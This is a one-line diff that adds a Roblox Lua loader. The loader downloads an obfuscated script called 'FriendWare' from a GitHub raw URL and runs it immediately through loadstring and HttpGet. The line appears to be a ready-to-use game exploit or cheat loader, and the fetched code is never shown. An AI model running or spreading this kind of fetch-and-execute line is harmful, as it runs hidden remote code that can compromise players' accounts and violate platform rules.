@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/michaelfinn69/Auto-Friend/main/Files_Obfuscated/FriendWare_Obfuscated.lua"))()
